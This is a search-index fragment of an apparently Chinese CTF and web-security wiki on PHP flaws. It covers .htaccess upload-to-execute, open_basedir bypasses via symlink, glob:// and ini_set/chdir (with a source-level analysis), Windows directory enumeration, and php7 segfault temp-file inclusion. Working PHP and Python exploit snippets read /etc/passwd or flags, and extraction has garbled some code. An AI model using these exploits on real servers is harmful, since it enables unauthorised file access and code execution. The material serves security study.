Contributing.</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/#get_header00","title":"get_header()\u51fd\u6570\u4f1a\u622a\u65ad\u7a7a\u5b57\u7b26\u540e\u7684\u5185\u5bb9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a%00","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/htaccess%E6%96%87%E4%BB%B6/","title":".htaccess\u6587\u4ef6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6</p> <p>\u5168\u79f0\u662fHypertext Access(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c \u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u901a\u5e38\u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\u4f7f\u7528\u3002\u4e0a\u4f20\u4e00\u4e2a.htaccess\u6587\u4ef6\u4e4b\u540e\u5c31\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5305\u542b1\u7684\u6587\u4ef6\u4e0a\u53bb\uff0c\u4e71\u6740\u6267\u884c\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/","title":"Open basedir\u7ed5\u8fc7","text":"<p>open_basedir\u7ed5\u8fc7</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>open_basedir\u662fphp.ini\u4e2d\u7684\u4e00\u4e2a\u914d\u7f6e\u9009\u9879\uff0c\u5b83\u53ef\u5c06\u7528\u6237\u8bbf\u95ee\u6587\u4ef6\u7684\u6d3b\u52a8\u8303\u56f4\u9650\u5236\u5728\u6307\u5b9a\u7684\u533a\u57df</p> <p>\u5047\u8bbeopen_basedir=/home/wwwroot/home/web1/:/tmp/\uff0c\u90a3\u4e48\u901a\u8fc7web1\u8bbf\u95ee\u670d\u52a1\u5668\u7684</p> <p>\u7528\u6237\u5c31\u65e0\u6cd5\u83b7\u53d6\u670d\u52a1\u5668\u4e0a\u9664\u4e86/home/wwwroot/home/web1/\u548c/tmp/\u8fd9\u4e24\u4e2a\u76ee\u5f55\u4ee5\u5916\u7684\u6587\u4ef6\u3002</p> <p>\u6ce8\u610f\u7528open_basedir\u6307\u5b9a\u7684\u9650\u5236\u5b9e\u9645\u4e0a\u662f\u524d\u7f00,\u800c\u4e0d\u662f\u76ee\u5f55\u540d\u3002\u4e3e\u4f8b\u6765\u8bf4: \u82e5\"open_basedir = /dir/user\", \u90a3\u4e48\u76ee\u5f55 \"/dir/user\" \u548c \"/dir/user1\"\u90fd\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002\u4ee5\u4e0b\u4e3a\u642c\u8fd0</p> <p>\u6211\u4eec\u5728wwwroot\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2ahtml\u6587\u4ef6\u5939\u548c\u4e00\u4e2a\u6587\u672c\u6587\u4ef61.txt</p> <p>\u5176\u4e2d1.txt\u5185\u5bb9\u4e3a123456</p> <p>html\u4e3a\u7f51\u7ad9\u6839\u76ee\u5f55\uff0c\u4e0b\u6709\u4e00\u4e2aindex.php\u548ctest.php</p> <p>\u5176\u4e2dtest.php\u5c31\u662f\u6211\u4eec\u7528\u6765\u6d4b\u8bd5\u7684php\u6587\u4ef6\uff0c\u5982\u4e0b</p> <pre><code>&lt;?php\nhighlight_file(\"../1.txt\");\n$file=file_get_contents('../1.txt');\necho $file;\n?&gt;\n</code></pre> <p>\u5728\u672a\u8bbe\u7f6eopen_basedir\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u7ed3\u679c</p> <p></p> <p>\u6211\u4eec\u8bbe\u7f6eopen_basedir</p> <p></p> <p>\u5373\u53ea\u80fd\u8bbf\u95eehtml\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6</p> <p></p> <p>\u53ef\u89c1\uff0c\u65e0\u8bba\u662ffile_get_contents\u51fd\u6570\u8fd8\u662fhighlight_file\u90fd\u65e0\u6548</p> <p>\u7531\u4e8eopen_basedir\u7684\u8bbe\u7f6e\u5bf9system\u7b49\u547d\u4ee4\u6267\u884c\u51fd\u6570\u662f\u65e0\u6548\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\u6765\u8bbf\u95ee\u9650\u5236\u76ee\u5f55\u3002</p> <p>\u6211\u4eec\u5c06test.php\u4fee\u6539\u540e</p> <p></p> <p>\u53ef\u89c1\u53ef\u4ee5\u65e0\u89c6open_basedir\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u4f1a\u7981\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u6240\u4ee5\u5b9e\u7528\u4ef7\u503c\u4e0d\u5927</p> <p>\uff08\u786e\u5b9e\uff0c\u6709system\u4e86\u8c01\u8fd8\u7ed5\u4f60\u4e2a\u5927\u5934\u9b3c\u554a\uff09</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#symlink","title":"\u8f6f\u94fe\u63a5\uff1asymlink()\u51fd\u6570","text":"<p>\u6ce8\u610f\uff1a \u9488\u5bf9 Windows\uff1a\u8fd0\u884c PHP \u4e8eVista\u3001Server 2008 \u6216\u66f4\u9ad8\u7248\u672c\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u3002 \u4e4b\u524d\u7248\u672c\u7684 Windows \u4e0d\u652f\u6301\u7b26\u53f7\u8fde\u63a5</p> <p>\u6b64\u6b21\u5b9e\u9a8c\u73af\u5883\uff1alinux Ubuntu18.04.4 php 7.1.31</p> <p>\u6211\u4eec\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528symlink\u521b\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5</p> <p></p> <p>\u76ee\u6807\u6307\u5411html\u76ee\u5f55\u4e0b\u7684error\u6587\u4ef6\u5939\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u751f\u6210\u4e00\u4e2a\u94fe\u63a5</p> <p></p> <p>\u53cc\u51fb\u8fdb\u53bb\u53ef\u4ee5\u8bbf\u95ee\u5230\u5982\u4e0b</p> <p></p> <p>\u6211\u4eec\u4fdd\u6301\u4e4b\u524d\u7684\u8bbe\u7f6e\u4e0d\u53d8\uff0c\u5c1d\u8bd5\u5728open_basedir\u8bbe\u7f6e\u5230html\u76ee\u5f55\u4e0b\uff0c\u8bfb\u53d6\u548chtml\u6587\u4ef6\u5939\u5e73\u884c\u76841.txt</p> <p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1ephp\u5185\u5bb9</p> <pre><code>&lt;?php\nmkdir(\"c\");\nchdir(\"c\");\nmkdir(\"d\");\nchdir(\"d\");\nchdir(\"..\");\nchdir(\"..\");\nsymlink(\"c/d\",\"tmplink\");\nsymlink(\"tmplink/../../1.txt\",\"exploit\");\nunlink(\"tmplink\");\nmkdir(\"tmplink\");\necho file_get_contents(\"http://localhost/exploit\");\n?&gt;\n</code></pre> <p>\u8fd0\u884c\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u53ef\u89c1\u5728html\u4e0b\u751f\u6210c/d/\u548ctmplink\u4ee5\u53caexploit\uff0c\u800c\u6211\u4eec\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt\u7684\u5185\u5bb9</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0b\u94fe\u63a5</p> <p></p> <p>exploit\u94fe\u63a5\u5230\u7684\u662ftmplink/../../1.txt\uff0c\u800ctmplink\u94fe\u63a5\u5230c/d\uff0c\u76f8\u5f53\u4e8eexploit\u94fe\u63a5\u5230c/d/../../1.txt\uff0c\u8def\u5f84\u5728open_basedir\u89c4\u5b9a\u7684\u76ee\u5f55\u4e0b\uff0c\u7b26\u5408\u64cd\u4f5c\u89c4\u8303\uff0c\u4e4b\u540e\u5220\u9664\u4e86tmplink\u94fe\u63a5\uff0c\u521b\u5efa\u4e86tmplink\u5b9e\u4f53\u6587\u4ef6\u5939\uff0c\u76f8\u5f53\u4e8e\u6b64\u65f6\u7684exploit\u6307\u5411\u7684\u5c31\u662ftmplink/../../1.txt,\u4e5f\u5c31\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt</p> <p>\u5173\u4e8e\u8f6f\u94fe\u4e5f\u53ef\u4ee5\u6709\u53e6\u4e00\u79cd\u505a\u6cd5\uff0c\u6d4b\u8bd5php\u5982\u4e0b</p> <pre><code>mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);\nsymlink('/var/www/html/a/b/c/d/e/f/g','foo');\nini_set('open_basedir','/var/www/html:bar/');\nsymlink('foo/../../../../../../','bar');\nunlink('foo');\nsymlink('/var/www/html','foo');\necho file_get_contents('bar/etc/passwd');\n</code></pre> <p>\u539f\u7406\u662f\u4e00\u6837\u7684\uff0c\u53ea\u4e0d\u8fc7\u628a\u8f6f\u94fe\u6539\u4e3a\u5b9e\u4f53\u6587\u4ef6\u5939\u7684\u6b65\u9aa4\u6362\u6210\u4e86\u91cd\u6784\u8f6f\u94fe\u76ee\u6807</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#glob","title":"glob\u4f2a\u534f\u8bae","text":"<p>glob\u4f2a\u534f\u8bae\u5728\u7b5b\u9009\u76ee\u5f55\u65f6\u4e0d\u53d7open_basedir\u5236\u7ea6</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$file_list = array();\n// normal files\n$it = new DirectoryIterator(\"glob:///*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\n// special files (starting with a dot(.))\n$it = new DirectoryIterator(\"glob:///.*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\nsort($file_list);\nforeach($file_list as $f){\necho \"{$f}&lt;br/&gt;\";\n}\n?&gt;\n</code></pre> <p>\u4e0a\u8ff0payload\u53ef\u5728php5.3\u4ee5\u4e0a\u8bfb\u53d6\u4ec5\u9488\u5bf9linux\u6839\u76ee\u5f55\u7684\u76ee\u5f55</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set","title":"\u5229\u7528ini_set\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9","text":"<p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u7531\u4e8e\u6f0f\u6d1e\u539f\u7406\u590d\u6742\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\uff0c\u8fd9\u91cc\u5c31\u4e0d\u53d9\u8ff0</p> <pre><code>&lt;?php\nmkdir('tmpdir');\nchdir('tmpdir');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\n$a=file_get_contents('/etc/passwd');\nvar_dump($a);\n?&gt;\n</code></pre> <p>\u6ce8\u610f\uff1a\u8fd9\u91cc\u7684chdir(\"..\");\u6570\u91cf\u636e\u5177\u4f53\u73af\u5883\u4fee\u6539\uff0c\u4e00\u822c\u8981\u6c42\u662f\u5982\u679c\u518dchdir\u4e00\u6b21\u5c31\u8fdb\u5165\u6839\u76ee\u5f55\u4e3a\u6b62\uff0c\u6bd4\u5982php\u6587\u4ef6\u7684\u4f4d\u7f6e\u4e3a/www/admin/localhost_80/wwwroot/html/\u4e0b,\u90a3\u4e48\u5c31\u8981\u4f7f\u7528\u4e94\u6b21chdir(\"..\");</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_1","title":"\u516d.\u5176\u4ed6\u8bfb\u76ee\u5f55\u65b9\u5f0f","text":"<p>\u5bf9\u4e8ewindows\u7cfb\u7edf</p> <pre><code>&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\nrealpath($file);\n}\nfunction isexists($errno, $errstr)\n{\n$regexp = '/File\\((.*)\\) is not within/';\npreg_match($regexp, $errstr, $matches);\nif (isset($matches[1])) {\nprintf(\"%s &lt;br/&gt;\", $matches[1]);\n}\n}\n?&gt;\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\n$basedir = 'D:/test/';\n$arr = array();\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');\n$re = $info-&gt;getRealPath();\nif ($re) {\ndump($re);\n}\n}\nfunction dump($s){\necho $s . '&lt;br/&gt;';\nob_flush();\nflush();\n}\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\n//$m = imagecreatefrompng(\"zip.png\");\n//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');\nimageftbbox(100, 100, $file, 'aaa');\n}\nfunction isexists($errno, $errstr)\n{\nglobal $file;\nif (stripos($errstr, 'Invalid font filename') === FALSE) {\nprintf(\"%s&lt;br/&gt;\", $file);\n}\n}\n?&gt;\n</code></pre> <p>\u4ee5\u4e0a\u90fd\u662fwindows\u4e0b\u7684\u5217\u76ee\u5f55\u65b9\u5f0f\uff0c\u7528\u5230\u4e86windows\u4e0b\u901a\u914d\u7b26&lt;&gt;</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$re = bindtextdomain('xxx', $_GET['dir']);\nvar_dump($re);\n?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u662flinux\u4e0b\u7684\u65b9\u6cd5\uff0cdir\u4f20\u5165\u7684\u53c2\u6570\u662f\u76ee\u5f55\uff0c\u5982\u679c\u76ee\u5f55\u5b58\u5728\uff0c\u5c31\u8fd4\u56de\u76ee\u5f55\u8def\u5f84\uff0c\u4e0d\u5b58\u5728\u5c31\u8fd4\u56debool(false)\uff0c\u7528\u4e8e\u66b4\u529b\u731c\u89e3\u76ee\u5f55</p> <p>\u5173\u4e8eini_set\u7684\u539f\u7406\uff0c\u6211\u4e5f\u627e\u5230\u4e86\u4e00\u70b9\u5185\u5bb9\u76f4\u63a5copy\u4e0b\u6765\u3002</p> <p>\u5148\u770bpayload</p> <pre><code>chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_2","title":"\u6e90\u7801\u5206\u6790","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set_1","title":"ini_set","text":"<p>\u5f88\u597d\u641c</p> <p></p> <p>\u5bf9\u7740php.net\u7684\u89e3\u91ca\u770b\u4e00\u4e0b \u731c\u4e5f\u80fd\u731c\u4e2a\u5927\u6982</p> <p>\u5148\u8df3\u8fc7<code>php_check_open_basedir</code>\u770b<code>zend_alter_ini_entry_ex</code></p> <p></p> <p>\u5148\u4eceEG\u8868\u4e2d\u53d6\u51fa\u8981\u4fee\u6539\u7684\u9879\u76ee\u7684\u6307\u9488\uff0c\u7136\u540e\u4e00\u8def\u8d4b\u503c\u8fc7\u53bb<code>new_value =&gt; duplicate =&gt; ini_entry-&gt;value</code></p> <p>\u76f4\u63a5\u770b\u4e0bgdb\u7684\u8c03\u8bd5\u7ed3\u679c \u6700\u521d\u7684\u65f6\u5019\u503c\u662fini\u91cc\u9762\u7684\u503c</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb \u53ef\u4ee5\u770b\u5230\u503c\u6539\u53d8\u4e86</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#chdir","title":"chdir","text":"<p>\u5148\u7ecf\u8fc7open_basedir\u7684\u68c0\u6d4b \u7136\u540e\u6765\u5230336\u884c<code>VCWD_CHDIR</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u4f1a\u8c03\u7528<code>_chdir()</code>\u6765\u4fee\u6539\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#open_basedir","title":"open_basedir\u5b9e\u73b0","text":"<p>\u8fd9\u4e2a\u4e5f\u7b80\u5355 \u5148\u770b\u4e0b\u62a5\u9519\u641c\u6e90\u4ee3\u7801</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u4e0a\u9762\u5ffd\u7565\u7684<code>php_check_open_basedir</code>\u7684\u5177\u4f53\u5b9e\u73b0 \u51fd\u6570\u5f88\u7b80\u5355\u6ca1\u5565\u597d\u8bf4\u7684 \u76f4\u63a5\u8ddf<code>php_check_specific_open_basedir</code>(\u867d\u7136\u8fd9\u91cc<code>ptr</code>\u7684\u503c\u6765\u81ea<code>PG(open_basedir)</code>\u4f46\u662f\u5728<code>ini_set</code>\u4e2d\u4f5c\u51fa\u7684\u5bf9<code>EG</code>\u7684\u4fee\u6539\u6700\u7ec8\u4f1a\u5f71\u54cd<code>PG</code>)</p> <p>\u51fd\u6570\u6709\u70b9\u957f\u4e0d\u60f3\u770b \u76f4\u63a5gdb\u8c03\u4e00\u53d1 \u5bf9\u7740<code>php_check_specific_open_basedir</code>\u6253\u4e2a\u65ad\u70b9 \u7136\u540e\u76f4\u63a5c\u5230\u7b2c\u4e00\u4e2a<code>chdir('..')</code></p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4f20\u8fdb\u53bb\u7684\u4e24\u4e2a\u53c2\u6570 \u7ee7\u7eed\u6267\u884c\u6765\u5230161\u884c \u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53c2\u6570</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb \u4f1a\u53d1\u73b0\u4e00\u4e2a\u6709\u8da3\u7684\u7ed3\u679c<code>/ =&gt; \\000</code></p> <p></p> <p>\u770b\u4e0b\u6e90\u7801 \u8089\u773c\u8ddf\u4e00\u4e0b\u6765\u5230<code>expand_filepath_with_mode</code>\u5927\u81f4\u529f\u80fd\u5c31\u662f\u89c4\u8303\u5316\u8def\u5f84</p> <p></p> <p><code>relative_to</code>\u5fc5\u5b9a\u4e3aNULL \u6240\u4ee5\u5fc5\u5b9a\u8fdb\u5165esle\u903b\u8f91 \u800c<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u662f\u901a\u8fc7<code>_getcwd()</code>\u5b9e\u73b0\u7684</p> <p>\u7ee7\u7eed\u8ddf \u6765\u5230216\u884c \u8fd8\u662f\u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53d8\u91cf\u7684\u503c</p> <p>\u7ee7\u7eed\u6267\u884c\u5230<code>strncmp</code>\u518d\u770b\u4e00\u4e0b\u53d8\u91cf\u7684\u503c</p> <p></p> <p>\u770b\u4e86\u4e0b\u5c31<code>resolved_name_len</code>\u53d8\u5316\u4e86 \u56de\u53bb\u770b\u6e90\u4ee3\u7801</p> <pre><code>resolved_name_len = strlen(resolved_name);\n</code></pre> <p>\u56e0\u4e3ac\u4e2d\u5b57\u7b26\u4e32\u662f\u4ee5<code>\\0</code>\u4e3a\u7ed3\u5c3e \u6240\u4ee5\u957f\u5ea6\u4ece17\u53d8\u4e3a13 \u7ecf\u8fc7<code>strncmp</code>\u5224\u65ad \u524d13\u300114\u4f4d\u80af\u5b9a\u4e00\u6837 \u8fd4\u56de0 \u7136\u540e\u8fd9\u4e2acheck\u5c31\u8fc7\u4e86</p> <p>\u5230\u8fd9\u91cc\u4e3a\u6b62\u597d\u50cf\u8fd8\u6ca1\u4ec0\u4e48\u95ee\u9898 \u90a3\u4e48\u56de\u5230\u521a\u521a</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_3","title":"\u95ee\u9898\u6240\u5728","text":"<p>\u521a\u624d\u662f\u4ece\u7b2c\u4e00\u4e2a<code>chdir('..')</code>\u5f00\u59cb\u8c03\u8bd5\u7684 \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b</p> <p>\u9996\u5148\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u7684\u503c\u90fd\u662f\u90fd\u662f<code>..</code>\u8fd9\u4e2a\u5e94\u8be5\u6ca1\u4ec0\u4e48\u95ee\u9898</p> <p></p> <p>\u6765\u5230151\u884c \u5c31\u662f\u4e00\u4e2a\u590d\u5236\u611f\u89c9\u4e5f\u6ca1\u95ee\u9898</p> <pre><code>strlcpy(local_open_basedir, basedir, sizeof(local_open_basedir));\n</code></pre> <p>\u770b\u4e00\u4e0b\u503c</p> <p></p> <p>\u95ee\u9898\u6765\u4e86<code>local_open_basedir</code>\u4f1a\u5728\u4e4b\u540e\u7684\u903b\u8f91\u4e2d\u53c2\u4e0e<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316</p> <p>\u4f46\u662f\u7531\u4e8e\u5f00\u5934\u7684<code>..\\0</code>\u4f1a\u4f7f\u5f97<code>resolved_basedir</code>\u7684\u89c4\u8303\u5316\u6d41\u7a0b\u548c<code>resolved_name</code>\u4e00\u6837 \u90fd\u662f\u4ee5\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e3a\u57fa\u7840\u8fdb\u884c\u5904\u7406</p> <p></p> <p><code>..\\0</code>\u5bfc\u81f4if\u5fc5\u7136\u662f\u5047 \u4ece\u800c\u8fdb\u5165else\u903b\u8f91 \u90a3\u5c31\u4e00\u5b9a\u4f1a\u5230<code>VCWD_GETCWD</code>\u8fd9\u4e2a\u5b8f \u6700\u540e\u4f1a\u4f7f<code>resolved_basedir</code>\u548c<code>resolved_name</code>\u7684\u503c\u51e0\u4e4e\u4e00\u6837</p> <p>\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86<code>php_check_specific_open_basedir</code>\u4e00\u76f4\u8fd4\u56de0 \u4ece\u800c\u63a7\u5236\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e00\u76f4\u5411\u4e0a\u7a7f\u8d8a \u5bfc\u81f4open_basedir\u88ab\u7ed5\u8fc7</p> <p>\u8fd9\u91cc\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06open_basedir\u8bbe\u7f6e\u4e3a<code>..</code>\u5728payload\u4e2d\u5148<code>chdir</code>\u5230\u4e86img \u518d\u5229\u7528open_basedir\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u76ee\u5f55\u7684\u7279\u70b9\u8fdb\u884cbypass</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/php7_segment_fault%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"php7 segment fault\u4e34\u65f6\u6587\u4ef6\u5305\u542b","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5411PHP\u53d1\u9001\u542b\u6709\u6587\u4ef6\u533a\u5757\u7684\u6570\u636e\u5305\u65f6\uff0c\u8ba9PHP\u5f02\u5e38\u5d29\u6e83\u9000\u51fa\uff0cPOST\u7684\u4e34\u65f6\u6587\u4ef6\u5c31\u4f1a\u88ab\u4fdd\u7559</p> <p>1.\u5229\u7528\u80fd\u8bbf\u95ee\u7684phpinfo\u9875\u9762\uff0c\u5bf9\u5176\u4e00\u6b21\u53d1\u9001\u5927\u91cf\u6570\u636e\u9020\u6210\u4e34\u65f6\u6587\u4ef6\u6ca1\u6709\u53ca\u65f6\u88ab\u5220\u9664</p> <p>2.PHP\u7248\u672c&lt;7.2\uff0c\u5229\u7528php\u5d29\u6e83\u7559\u4e0b\u4e34\u65f6\u6587\u4ef6</p> <p>php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwd</p> <ul> <li> <p>php7 \u8001\u7248\u672c\u901a\u6740php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</p> </li> <li> <pre><code>import requestsfrom io import BytesIOurl=\"http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"payload=\"&lt;?php phpinfo();?&gt;\"files={    \"file\":BytesIO(payload.encode())}r=requests.post(url=url,files=files,allow_redirects=False)\nprint(r.text)\nPython\n</code></pre> </li> </ul> 